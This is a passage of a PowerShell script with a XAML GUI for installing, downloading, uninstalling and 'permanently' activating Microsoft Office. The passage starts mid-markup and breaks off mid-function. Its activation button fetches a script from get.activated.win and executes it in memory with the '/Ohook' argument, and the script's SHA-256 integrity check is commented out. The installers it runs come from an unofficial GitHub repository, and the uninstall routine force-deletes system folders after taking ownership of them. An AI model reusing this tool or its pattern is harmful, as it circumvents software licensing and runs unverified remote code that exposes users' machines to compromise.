        <Label x:Name="Link1" HorizontalAlignment="Left" Margin="426,441,0,0" VerticalAlignment="Top" Width="126" FontSize='10.5' FontFamily="Consolas" Padding="5,5,5,2">
            <Hyperlink NavigateUri="https://hinzdc.xyz">hinzdc.xyz</Hyperlink>
        </Label>
        <Border Width="115" Height="65" Background="{DynamicResource BorderBackgroud}"
            CornerRadius="10"
            HorizontalAlignment="Left" VerticalAlignment="Top"
            Margin="10,167,0,0">
            <Border.Effect>
                <DropShadowEffect Color="Black" Opacity="0.3" BlurRadius="12" ShadowDepth="3"/>
            </Border.Effect>
        </Border>
        <Label x:Name="LabelMode" Content="Mode" FontWeight="Bold"
           HorizontalAlignment="Left" VerticalAlignment="Top"
           Foreground="White" Padding="10,1,8,2"
           Background="#3283d6"
           Margin="0,157,0,0" Width="89"/>
        <StackPanel Orientation="Vertical" Margin="20,180,1035,250">
            <RadioButton x:Name="radioButtonInstall" Content="Install" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0" IsChecked="True"/>
            <RadioButton x:Name="radioButtonDownload" Content="Download" FontFamily="Consolas" Foreground="{DynamicResource TextColor}" Margin="0,5,0,0"/>
        </StackPanel>
        <Button x:Name="buttonActivate" Content="Activation"
                Width="108" Height="27" 
                Canvas.Left="870" Canvas.Top="410"
                Style="{StaticResource RedButtonStyle}" Cursor="Hand"
                ToolTipService.ShowDuration="5000"
                ToolTipService.InitialShowDelay="500" Margin="1027,485,19,-8">
            <Button.ToolTip>
                <ToolTip Content="Klik untuk mengaktivasi Office secara permanen." />
            </Button.ToolTip>
        </Button>

    </Grid>
</Window>

'@

# Memuat XAML
[xml]$xaml = $xamlInput -replace '^<Window.*', '<Window' -replace 'mc:Ignorable="d"','' -replace "x:Name",'Name'
$xmlReader = (New-Object System.Xml.XmlNodeReader $xaml)
$Form = [Windows.Markup.XamlReader]::Load( $xmlReader )

# Store form objects (variables) in PowerShell
    $xaml.SelectNodes("//*[@Name]") | ForEach-Object -Process {
        Set-Variable -Name ($_.Name) -Value $Form.FindName($_.Name)
    }

#DEBUG
if ($null -eq $Form) {
    Write-Host " XAML gagal di-load. Periksa struktur XAML!"
} else {
    Write-Host " XAML berhasil di-load!"
}
# Periksa elemen dalam $Form untuk debugging
#$Form.Resources.Keys | ForEach-Object { Write-Host " Resource Found: $_" }

$Link1.Add_PreviewMouseDown({[system.Diagnostics.Process]::start('https://hinzdc.xyz')})


# Get the Storyboard resource
$storyboard = $Form.FindResource("RotateStoryboard")

# Set the target for the storyboard animation
[Windows.Media.Animation.Storyboard]::SetTarget($storyboard, $Form.FindName("image"))

# Start the animation
$storyboard.Begin()

# Deteksi tema sistem
# Terapkan tema awal
$global:currentTheme = Get-SystemTheme
Apply-Theme $Form $global:currentTheme

# Gunakan Timer untuk cek tema setiap detik (Auto Update)
$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(1)
$timer.Add_Tick({
        $newTheme = Get-SystemTheme
        if ($newTheme -ne $global:currentTheme) {
            Write-Host "Tema berubah! Memperbarui UI $newTheme ..."
            $global:currentTheme = $newTheme
            Apply-Theme $Form $global:currentTheme
        }
    })
    $timer.Start()
    
    
    # Download links
    $uri = "https://github.com/hinzdc/get/raw/main/office/bin/setup.exe"
    $uri2013 = "https://github.com/hinzdc/get/raw/main/office/bin/bin2013.exe"
    # $uninstall = './scripts/office/uninstall.bat'
    # $readme = './scripts/office/Readme.txt'
    
    # Prepiaration for download and install
    function PreparingOffice {
        if ($radioButtonDownload.IsChecked) {
            $workingDir = New-Item -Path $env:userprofile\Desktop\$productId -ItemType Directory -Force
            Set-Location $workingDir
            Invoke-Item $workingDir
        }
        
        if ($radioButtonInstall.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun\$productId -ItemType Directory -Force
            Set-Location $workingDir
        }

        $configurationFile = "configuration-x$arch.xml"
        New-Item $configurationFile -ItemType File -Force | Out-Null
        Add-Content $configurationFile -Value "<Configuration>"
        Add-content $configurationFile -Value "<Add OfficeClientEdition=`"$arch`" Channel=`"Current`">"
        Add-content $configurationFile -Value "<Product ID=`"$productId`">"
        Add-content $configurationFile -Value "<Language ID=`"$languageId`"/>"
        Add-Content $configurationFile -Value '</Product>'
        Add-Content $configurationFile -Value '</Add>'
        Add-Content $configurationFile -Value "<Property Name=`"FORCEAPPSHUTDOWN`" Value=`"TRUE`" />"
        Add-Content $configurationFile -Value '<Updates Enabled="TRUE" />'
        Add-Content $configurationFile -Value '<Display Level="Full" AcceptEULA="TRUE" />'
        Add-Content $configurationFile -Value '</Configuration>'
        
        $batchFile = "Install-x$arch.bat"
        New-Item $batchFile -ItemType File -Force | Out-Null
        Add-content $batchFile -Value "ClickToRun.exe /configure $configurationFile"
        
        (New-Object Net.WebClient).DownloadFile($uri, "$workingDir\ClickToRun.exe")
        # (New-Object Net.WebClient).DownloadFile($readme, "$workingDir\01.Readme.txt")
        
        $sync.configurationFile = $configurationFile
        $sync.workingDir = $workingDir
    }
    
    # Creating script block for download and install
    $DownloadInstallOffice = {
        function Write-HostDebug {
            #Helper function to write back to the host debug output
            param([Parameter(Mandatory)]
            [string]
            $debugMessage)
            if ($sync.DebugPreference) {
                $sync.host.UI.WriteDebugLine($debugMessage)
            }
        }
        
        function Write-VerboseDebug {
            param([Parameter(Mandatory)]
            [string]
            $verboseMessage)
            if ($sync.VerbosePreference) {
                $sync.host.UI.WriteVerboseLine($verboseMessage)
            }
        }
        
        Write-VerboseDebug "Downloading the $($sync.productName)"
        Write-VerboseDebug "Mode: $($sync.mode)"
        Write-VerboseDebug "Configuration file: $($sync.configurationFile)"
        
        # To referece our elements we use the $sync variable from hashtable.
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "$($sync.UIstatus) $($sync.productName) $($sync.arch)-bit ($($sync.language))" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.BorderBrush = "#FF707070" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $true })
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Visible" })

        Set-Location -Path $($sync.workingDir)
        Write-VerboseDebug "Working (download) path: $pwd"
        Write-VerboseDebug "Command to run: .\ClickToRun.exe $($sync.mode) .\$($sync.configurationFile)"
        
        Start-Process -FilePath .\ClickToRun.exe -ArgumentList "$($sync.mode) .\$($sync.configurationFile)" -NoNewWindow -Wait
                
        # Bring back our Button, set the Label and ProgressBar, we're done..
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = 'Visible' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Content = 'SUBMIT' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "$($sync.UIstatus) Completed" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $false })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.Value = '100' })

        Write-VerboseDebug "Done. You can close this window now."
        Write-Host " Done. You can close this window now."
    }

    # Share info between runspaces
    $sync = [hashtable]::Synchronized(@{})
    $sync.runspace = $runspace
    $sync.host = $host
    $sync.Form = $Form
    $sync.ProgressBar = $ProgressBar
    $sync.textbox = $textbox
    $sync.textboxlog = $textboxlog
    $sync.image = $image
    $sync.buttonSubmit = $buttonSubmit
    $sync.DebugPreference = $DebugPreference
    $sync.VerbosePreference = $VerbosePreference

    # Build a runspace
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.ApartmentState = 'STA'
    $runspace.ThreadOptions = 'ReuseThread'
    $runspace.Open()
    
    # Add shared data to the runspace
    $runspace.SessionStateProxy.SetVariable("sync", $sync)
    
    # Create a Powershell instance
    $PSIinstance = [powershell]::Create().AddScript($scriptBlock)
    $PSIinstance.Runspace = $runspace
    
    #$VerbosePreference = "Continue"
    #$DebugPreference = "Continue"
# Event handler untuk perubahan pilihan RadioButton
$radioButtonDownload.Add_Checked({
    UpdateButtonState
})

$radioButtonInstall.Add_Checked({
    UpdateButtonState
})

# Fungsi untuk memperbarui teks tombol berdasarkan pilihan RadioButton
function UpdateButtonState {
    if ($radioButtonDownload.IsChecked) {
        $buttonText = 'DOWNLOAD'
    }
    elseif ($radioButtonInstall.IsChecked) {
        $buttonText = 'INSTALL'
    }
    else {
        return  # Jika tidak ada radio button yang dipilih, keluar dari fungsi
    }

    # Gunakan Dispatcher untuk memperbarui UI di thread utama
    $sync.Form.Dispatcher.Invoke([action] { 
        $sync.buttonSubmit.Content = $buttonText 
    })
}
    
# INSTALL/DOWNLOAD/ACTIVATE Microsoft Office with a runspace

    $buttonSubmit.Add_Click( {
            $i = 0
            if ($radioButtonArch64.IsChecked) {$arch = '64'}
            if ($radioButtonArch32.IsChecked) {$arch = '32'}

            if ($radioButtonRetail.IsChecked) {$licType = 'Retail'}
            if ($radioButtonVolume.IsChecked) {$licType = 'Volume'}

            if ($radioButtonEnglish.IsChecked) {$languageId="en-US"; $language = 'English'}
            if ($radioButtonIndonesian.IsChecked) {$languageId="id-ID"; $language = 'Indonesian'}
            if ($radioButtonJapanese.IsChecked) {$languageId="ja-JP"; $language = 'Japanese'}
            if ($radioButtonKorean.IsChecked) {$languageId="ko-KR"; $language = 'Korean'}
            if ($radioButtonChinese.IsChecked) {$languageId="zh-TW"; $language = 'Chinese'}
            if ($radioButtonFrench.IsChecked) {$languageId="fr-FR"; $language = 'French'}
            if ($radioButtonSpanish.IsChecked) {$languageId="es-ES"; $language = 'Spanish'}
            if ($radioButtonHindi.IsChecked) {$languageId="hi-IN"; $language = 'Hindi'}
            if ($radioButtonGerman.IsChecked) {$languageId="de-DE"; $language = 'German'}
            if ($radioButtonVietnamese.IsChecked) {$languageId="vi-VN"; $language = 'Vietnamese'}

            if ($radioButtonDownload.IsChecked) {$mode = '/download'; $UIstatus = 'Downlading'}
            if ($radioButtonInstall.IsChecked) {$mode = '/configure'; $UIstatus = 'Installing'}

        # For Microsoft 365
            if ($radioButton365Home.IsChecked -eq $true) {$productId = "O365HomePremRetail"; $productName = 'Microsoft 365 Home'; $i++}
            if ($radioButton365Business.IsChecked -eq $true) {$productId = "O365BusinessRetail"; $productName = 'Microsoft 365 Apps for Business'; $i++}
            if ($radioButton365Enterprise.IsChecked -eq $true) {$productId = "O365ProPlusRetail"; $productName = 'Microsoft 365 Apps for Enterprise'; $i++}

        # For Office 2024
            if ($radioButton2024Pro.IsChecked -eq $true) {$productId = "ProPlus2024$licType"; $productName = 'Microsoft 365 and Office Professional LTSC 2024'; $i++}
            if ($radioButton2024Std.IsChecked -eq $true) {$productId = "Standard2024$licType"; $productName = 'Office 2024 Standard LTSC'; $i++}
            if ($radioButton2024ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2024$licType"; $productName = 'Project Pro 2024'; $i++}
            if ($radioButton2024ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2024$licType"; $productName = 'Project Standard 2024'; $i++}
            if ($radioButton2024VisioPro.IsChecked -eq $true) {$productId = "VisioPro2024$licType"; $productName = 'Visio Pro 2024'; $i++}
            if ($radioButton2024VisioStd.IsChecked -eq $true) {$productId = "VisioStd2024$licType"; $productName = 'Visio Standard 2024'; $i++}
            if ($radioButton2024Word.IsChecked -eq $true) {$productId = "Word2024$licType"; $productName = 'Microsoft Word LTSC 2024'; $i++}
            if ($radioButton2024Excel.IsChecked -eq $true) {$productId = "Excel2024$licType"; $productName = 'Microsoft Excel LTSC 2024'; $i++}
            if ($radioButton2024PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2024$licType"; $productName = 'Microsoft PowerPoint LTSC 2024'; $i++}
            if ($radioButton2024Outlook.IsChecked -eq $true) {$productId = "Outlook2024$licType"; $productName = 'Microsoft Outlook LTSC 2024'; $i++}
            if ($radioButton2024Publisher.IsChecked -eq $true) {$productId = "Publisher2024$licType"; $productName = 'Microsoft Publisher LTSC 2024'; $i++}
            if ($radioButton2024Access.IsChecked -eq $true) {$productId = "Access2024$licType"; $productName = 'Microsoft Access LTSC 2024'; $i++}
            if ($radioButton2024HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2024Retail"; $productName = 'Office HomeBusiness 2024'; $i++}
            if ($radioButton2024HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2024Retail"; $productName = 'Office HomeStudent LTSC 2024'; $i++}

        # For Office 2021
            if ($radioButton2021Pro.IsChecked -eq $true) {$productId = "ProPlus2021$licType"; $productName = 'Microsoft Office Professional LTSC 2021'; $i++}
            if ($radioButton2021Std.IsChecked -eq $true) {$productId = "Standard2021$licType"; $productName = 'Office 2021 Standard LTSC'; $i++}
            if ($radioButton2021ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2021$licType"; $productName = 'Project Pro 2021'; $i++}
            if ($radioButton2021ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2021$licType"; $productName = 'Project Standard 2021'; $i++}
            if ($radioButton2021VisioPro.IsChecked -eq $true) {$productId = "VisioPro2021$licType"; $productName = 'Visio Pro 2021'; $i++}
            if ($radioButton2021VisioStd.IsChecked -eq $true) {$productId = "VisioStd2021$licType"; $productName = 'Visio Standard 2021'; $i++}
            if ($radioButton2021Word.IsChecked -eq $true) {$productId = "Word2021$licType"; $productName = 'Microsoft Word LTSC 2021'; $i++}
            if ($radioButton2021Excel.IsChecked -eq $true) {$productId = "Excel2021$licType"; $productName = 'Microsoft Excel LTSC 2021'; $i++}
            if ($radioButton2021PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2021$licType"; $productName = 'Microsoft PowerPoint LTSC 2021'; $i++}
            if ($radioButton2021Outlook.IsChecked -eq $true) {$productId = "Outlook2021$licType"; $productName = 'Microsoft Outlook LTSC 2021'; $i++}
            if ($radioButton2021Publisher.IsChecked -eq $true) {$productId = "Publisher2021$licType"; $productName = 'Microsoft Publisher LTSC 2021'; $i++}
            if ($radioButton2021Access.IsChecked -eq $true) {$productId = "Access2021$licType"; $productName = 'Microsoft Access LTSC 2021'; $i++}
            if ($radioButton2021HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2021Retail"; $productName = 'Office HomeBusiness 2021'; $i++}
            if ($radioButton2021HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2021Retail"; $productName = 'Office HomeStudent LTSC 2021'; $i++}

        # For Office 2019
            if ($radioButton2019Pro.IsChecked -eq $true) {$productId = "ProPlus2019$licType"; $productName = 'Microsoft Office 2019 Professional Plus'; $i++}
            if ($radioButton2019Std.IsChecked -eq $true) {$productId = "Standard2019$licType"; $productName = 'Office 2019 Standard'; $i++}
            if ($radioButton2019ProjectPro.IsChecked -eq $true) {$productId = "ProjectPro2019$licType"; $productName = 'Project Pro 2019'; $i++}
            if ($radioButton2019ProjectStd.IsChecked -eq $true) {$productId = "ProjectStd2019$licType"; $productName = 'Project Standard 2019'; $i++}
            if ($radioButton2019VisioPro.IsChecked -eq $true) {$productId = "VisioPro2019$licType"; $productName = 'Visio Pro 2019'; $i++}
            if ($radioButton2019VisioStd.IsChecked -eq $true) {$productId = "VisioStd2019$licType"; $productName = 'Visio Standard 2019'; $i++}
            if ($radioButton2019Word.IsChecked -eq $true) {$productId = "Word2019$licType"; $productName = 'Microsoft Word 2019'; $i++}
            if ($radioButton2019Excel.IsChecked -eq $true) {$productId = "Excel2019$licType"; $productName = 'Microsoft Excel 2019'; $i++}
            if ($radioButton2019PowerPoint.IsChecked -eq $true) {$productId = "PowerPoint2019$licType"; $productName = 'Microsoft PowerPoint 201p'; $i++}
            if ($radioButton2019Outlook.IsChecked -eq $true) {$productId = "Outlook2019$licType"; $productName = 'Microsoft Outlook 2019'; $i++}
            if ($radioButton2019Publisher.IsChecked -eq $true) {$productId = "Publisher2019$licType"; $productName = 'Microsoft Publisher 2019'; $i++}
            if ($radioButton2019Access.IsChecked -eq $true) {$productId = "Access2019$licType"; $productName = 'Microsoft Access 2019'; $i++}
            if ($radioButton2019HomeBusiness.IsChecked -eq $true) {$productId = "HomeBusiness2019Retail"; $productName = 'Office HomeBusiness 2019'; $i++}
            if ($radioButton2019HomeStudent.IsChecked -eq $true) {$productId = "HomeStudent2019Retail"; $productName = 'Office HomeStudent 2019'; $i++}

        # For Office 2016
            if ($radioButton2016Pro.IsChecked -eq $true) {$productId = "ProfessionalRetail"; $productName = 'Microsoft Office 2016 Professional Plus'; $i++}
            if ($radioButton2016Std.IsChecked -eq $true) {$productId = "StandardRetail"; $productName = 'Office 2016 Standard'; $i++}
            if ($radioButton2016ProjectPro.IsChecked -eq $true) {$productId = "ProjectProRetail"; $productName = 'Microsoft Project Pro 2016'; $i++}
            if ($radioButton2016ProjectStd.IsChecked -eq $true) {$productId = "ProjectStdRetail"; $productName = 'Microsoft Project Standard 2016'; $i++}
            if ($radioButton2016VisioPro.IsChecked -eq $true) {$productId = "VisioProRetail"; $productName = 'Microsoft Visio Pro 2016'; $i++}
            if ($radioButton2016VisioStd.IsChecked -eq $true) {$productId = "VisioStdRetail"; $productName = 'Microsoft Visio Standard 2016'; $i++}
            if ($radioButton2016Word.IsChecked -eq $true) {$productId = "WordRetail"; $productName = 'Microsoft Word 2016'; $i++}
            if ($radioButton2016Excel.IsChecked -eq $true) {$productId = "ExcelRetail"; $productName = 'Microsoft Excel 2016'; $i++}
            if ($radioButton2016PowerPoint.IsChecked -eq $true) {$productId = "PowerPointRetail"; $productName = 'Microsoft PowerPoint 2016'; $i++}
            if ($radioButton2016Outlook.IsChecked -eq $true) {$productId = "OutlookRetail"; $productName = 'Microsoft Outlook 2016'; $i++}
            if ($radioButton2016Publisher.IsChecked -eq $true) {$productId = "PublisherRetail"; $productName = 'Microsoft Publisher 2016'; $i++}
            if ($radioButton2016Access.IsChecked -eq $true) {$productId = "AccessRetail"; $productName = 'Microsoft Access 2016'; $i++}
            if ($radioButton2016OneNote.IsChecked -eq $true) {$productId = "OneNoteRetail"; $productName = 'Microsoft Onenote 2016'; $i++}

        # For Office 2013
            if ($radioButton2013Pro.IsChecked -eq $true) {$productId = "ProfessionalRetail"; $uri = $uri2013; $productName = 'Microsoft Office 2013 Professional Plus'; $i++}
            if ($radioButton2013Std.IsChecked -eq $true) {$productId = "StandardRetail"; $uri = $uri2013; $productName = 'Office 2013 Standard'; $i++}
            if ($radioButton2013ProjectPro.IsChecked -eq $true) {$productId = "ProjectProRetail"; $uri = $uri2013; $productName = 'Microsoft Project Pro 2013'; $i++}
            if ($radioButton2013ProjectStd.IsChecked -eq $true) {$productId = "ProjectStdRetail"; $uri = $uri2013; $productName = 'Microsoft Project Standard 2013'; $i++}
            if ($radioButton2013VisioPro.IsChecked -eq $true) {$productId = "VisioProRetail"; $uri = $uri2013; $productName = 'Microsoft Visio Pro 2013'; $i++}
            if ($radioButton2013VisioStd.IsChecked -eq $true) {$productId = "VisioStdRetail"; $uri = $uri2013; $productName = 'Microsoft Visio Standard 2013'; $i++}
            if ($radioButton2013Word.IsChecked -eq $true) {$productId = "WordRetail"; $uri = $uri2013; $productName = 'Microsoft Word 2013'; $i++}
            if ($radioButton2013Excel.IsChecked -eq $true) {$productId = "ExcelRetail"; $uri = $uri2013; $productName = 'Microsoft Excel 2013'; $i++}
            if ($radioButton2013PowerPoint.IsChecked -eq $true) {$productId = "PowerPointRetail"; $uri = $uri2013; $productName = 'Microsoft PowerPoint 2013'; $i++}
            if ($radioButton2013Outlook.IsChecked -eq $true) {$productId = "OutlookRetail"; $uri = $uri2013; $productName = 'Microsoft Outlook 2013'; $i++}
            if ($radioButton2013Publisher.IsChecked -eq $true) {$productId = "PublisherRetail"; $uri = $uri2013; $productName = 'Microsoft Publisher 2013'; $i++}
            if ($radioButton2013Access.IsChecked -eq $true) {$productId = "AccessRetail"; $uri = $uri2013; $productName = 'Microsoft Access 2013'; $i++}

        # Update the shared hashtable
            $sync.arch = $arch
            $sync.mode = $mode
            $sync.language = $language
            $sync.UIstatus = $UIstatus
            $sync.productName = $productName

            if ($i -eq '1') {
                PreparingOffice
                $PSIinstance = [powershell]::Create().AddScript($DownloadInstallOffice)
                $PSIinstance.Runspace = $runspace
                $PSIinstance.BeginInvoke()
                Write-Host " $UIstatus $productName"
            } else {
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Foreground = "Red" })
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.FontWeight = "Bold" })
                $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Please select an Office version." })
                Write-Host "Please select an Office version." -ForegroundColor Red
            }
    })

    # Aksi yang akan dijalankan di runspace (agar UI tidak nge-freeze)
    $ActivateAction = {
        param($sync, $url, $expectedSha256, $params)

        $sync.Form.Dispatcher.Invoke([action]{
            $sync.textbox.Text = "Activating Office..."
            $sync.ProgressBar.IsIndeterminate = $true
            $sync.image.Visibility = "Visible"
            $sync.buttonSubmit.Visibility = "Hidden"
            Write-Host "Activating Office..."
        })

        try {
            # Pastikan TLS modern
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

            # 1) Ambil teks skrip dari URL
            $scriptText = Invoke-RestMethod -Uri $url -Method Get -ErrorAction Stop

            # 2) verifikasi SHA-256 isi skrip
            <#if ($expectedSha256) {
                $sha = [System.Security.Cryptography.SHA256]::Create()
                $bytes = [Text.Encoding]::UTF8.GetBytes($scriptText)
                $actualSha256 = ([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace("-", "")
                if ($actualSha256 -ne $expectedSha256) {
                    throw "Hash skrip tidak cocok — kemungkinan berubah/manipulasi."
                }
            }#>

            # 3) Buat ScriptBlock dari teks, lalu jalankan dengan argumen
            $sb = [ScriptBlock]::Create($scriptText)

            # "/Ohook /HWID", kirim sebagai array string:
            & $sb @params | Out-Null

            $sync.Form.Dispatcher.Invoke([action]{
                $sync.textbox.Text = "Aktivasi Office Selesai."
                $sync.textbox.Foreground = "#03842cff"
                Write-Host "Aktivasi Office Selesai."
            })
        }
        catch {
            $sync.Form.Dispatcher.Invoke([action]{
                $sync.textbox.Text = "Aktivasi Office Gagal: $($_.Exception.Message)"
                $sync.textbox.Foreground = "Red"
                Write-Host "Aktivasi Office Gagal: $($_.Exception.Message)" -ForegroundColor Red
            })
        }
        finally {
            $sync.Form.Dispatcher.Invoke([action]{
                $sync.ProgressBar.IsIndeterminate = $false
                $sync.image.Visibility = "Hidden"
                $sync.buttonSubmit.Visibility = "Visible"
            })
        }
    }

    # Wire tombol ke runspace yang sudah kamu buat sebelumnya ($runspace)
    $buttonActivate.Add_Click({
        $url = 'https://get.activated.win'
        #$expectedSha256 = '' # (opsional) isi hash SHA-256 skrip untuk verifikasi integritas
        $params = @('/Ohook')

        $psAct = [powershell]::Create().
            AddScript($ActivateAction).
            AddArgument($sync).
            AddArgument($url).
            AddArgument($expectedSha256).
            AddArgument($params)

        $psAct.Runspace = $runspace
        $psAct.BeginInvoke() | Out-Null
    })

# Uninstall all installed Microsoft Office apps.
    $UninstallOffice = {

        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "Uninstalling Microsoft Office..." })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.BorderBrush = "#FF707070" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $true })
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Visible" })

        # Tentukan lokasi setup.exe untuk versi baru dan lama
        $SetupNew = "$env:TEMP\c2r\setup.exe"
        $SetupOld = "$env:TEMP\c2r\setupold.exe"

        # URL untuk mengunduh Office Deployment Tool yang sesuai
        $UrlNew = "https://github.com/hinzdc/get/raw/main/office/bin/setup.exe"
        $UrlOld = "https://github.com/hinzdc/get/raw/main/office/bin/bin2013.exe"

        # Fungsi untuk mengunduh setup.exe jika belum ada
        function Download-Setup {
            param (
                [string]$Url,
                [string]$Destination
            )
            if (!(Test-Path $Destination)) {
                try {
                    Invoke-WebRequest -Uri $Url -OutFile $Destination -ErrorAction Stop
                    Write-Host "Berhasil mengunduh $Destination"
                } catch {
                    Write-Host "Gagal mengunduh $Url"
                    exit 1
                }
            }
        }

        # Fungsi untuk mendeteksi versi Office yang terinstal
        function Get-InstalledOfficeVersion {
            $OfficeKeys = @(
                "HKLM:\SOFTWARE\Microsoft\Office",
                "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office"
            )

            $DetectedVersions = @()

            foreach ($Key in $OfficeKeys) {
                if (Test-Path "$Key\16.0") {
                    $DetectedVersions += "2016-2024"
                }
                if (Test-Path "$Key\15.0") {
                    $DetectedVersions += "2013"
                }
            }

            return $DetectedVersions
        }
        
        # ==================================================================
        #  STOP RUNNING OFFICE APP
        # ==================================================================
        Function Stop-OfficeProcess {
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Stop Running Office Application." })
            Stop-Service -Name "Clicktorunsvc" -Force -ErrorAction SilentlyContinue
            Write-Host "Stopping running Office applications ..."
            $OfficeProcessesArray = "OfficeClickToRun", "OfficeC2RClient", "officesvcmgr", "lync", "winword", "excel", "msaccess", "mstore", "infopath", "setlang", "msouc", "ois", "onenote", "outlook", "powerpnt", "mspub", "groove", "visio", "winproj", "graph", "teams"
            foreach ($ProcessName in $OfficeProcessesArray) {
                if (get-process -Name $ProcessName -ErrorAction SilentlyContinue) {
                    if (Stop-Process -Name $ProcessName -Force -ErrorAction SilentlyContinue) {
                        Write-Output "Process $ProcessName was stopped."
                    }
                    else {
                        Write-Warning "Process $ProcessName could not be stopped."
                    }
                } 
            }
        }

        # Fungsi untuk menjalankan uninstalasi
        function Uninstall-Office {
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Uninstall Office App." })
            param (
                [string]$SetupPath,
                [string]$ConfigFile
            )

            if (Test-Path $SetupPath) {
                Write-Host " Menjalankan uninstalasi menggunakan $SetupPath..."
                Start-Process -FilePath $SetupPath -ArgumentList "/configure $ConfigFile" -Wait -NoNewWindow
                Write-Host " Proses uninstall selesai untuk $SetupPath"
            } else {
                Write-Host " File setup tidak ditemukan: $SetupPath"
                exit 1
            }
        }

        # ==================================================================
        #  HAPUS FOLDER INSTALASI OFFICE
        # ==================================================================
        function Remove-OfficeFoldersAndRegistry {

            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Cleanup Office Folder." })
            $folders = @(
                "$env:PROGRAMFILES\Microsoft Office 15",
                "$env:PROGRAMFILES\Common Files\Microsoft Office 15",
                "$env:PROGRAMFILES\Common Files\Microsoft Office 16",
                "$env:PROGRAMFILES\Common Files\microsoft shared\ClickToRun",
                "$env:PROGRAMFILES(x86)\Microsoft Office 15",
                "$env:PROGRAMFILES(x86)\Common Files\Microsoft Office 15",
                "$env:PROGRAMFILES(x86)\Common Files\Microsoft Office 16",
                "$env:PROGRAMFILES(x86)\Microsoft Office\root",
                "$env:PROGRAMFILES(x86)\Microsoft Office",
                "$env:PROGRAMFILES\Microsoft Office\root",
                "$env:PROGRAMFILES\Microsoft Office",
                "$env:COMMONPROGRAMFILES(x86)\Microsoft Shared\Office*",
                "$env:COMMONPROGRAMFILES\Microsoft Shared\Office*",
                "$env:PROGRAMDATA\Microsoft\Office",
                "$env:PROGRAMDATA\Microsoft\ClickToRun",
                "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Microsoft Office Tools*",
                "$env:APPDATA\Microsoft\Templates\Normal.dotm",
                "$env:APPDATA\Microsoft\Templates\Word.dotx",
                "$env:APPDATA\Microsoft\document building blocks\3082\15\Building Blocks.dotx",
                "$env:USERPROFILE\Microsoft Office",
                "$env:USERPROFILE\Microsoft Office 15",
                "$env:USERPROFILE\Microsoft Office 16"
            )
            foreach ($folder in $folders) {
                if (Test-Path $folder) {
                    Takeown /f $folder /r /d Y
                    Attrib -r -s -h $folder /s /d
                    Remove-Item -Path $folder -Recurse -Force -ErrorAction SilentlyContinue
                }
            }

            # ==================================================================
            # HAPUS SHORTCUT DARI DESKTOP, START MENU DAN TASKBAR
            # ==================================================================
            $sync.Form.Dispatcher.Invoke([action] { $sync.textboxlog.Text = "> Remove ShortCut." })
            $shortcutPaths = @(
                "$env:PUBLIC\Desktop",  # Desktop semua pengguna
                "$env:USERPROFILE\Desktop",  # Desktop user saat ini
                "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Microsoft Office*",
                "$env:USERPROFILE\Microsoft\Windows\Start Menu\Programs\Microsoft Office*",
                "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",  # Start Menu pengguna saat ini
                "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs"  # Start Menu semua pengguna
            )

            # Daftar shortcut Office yang akan dihapus
            $shortcuts = @(
                # Versi Office 2013 & 2016
                "Word 2013.lnk", "Excel 2013.lnk", "PowerPoint 2013.lnk", "Outlook 2013.lnk",
                "Word 2016.lnk", "Excel 2016.lnk", "PowerPoint 2016.lnk", "Outlook 2016.lnk",
                
                # Versi Office 2019, 2021, 2024 (tidak ada angka tahunnya)
                "Word.lnk", "Excel.lnk", "PowerPoint.lnk", "Outlook*.lnk", "OneNote.lnk",
                "Access.lnk", "Publisher.lnk", "Visio.lnk", "Project.lnk"
                )
                
                # Hapus shortcut dari Desktop & Start Menu
                foreach ($path in $shortcutPaths) {
                    foreach ($shortcut in $shortcuts) {
                    $shortcutFullPath = "$path\$shortcut"
                    if (Test-Path $shortcutFullPath) {
                        Try {
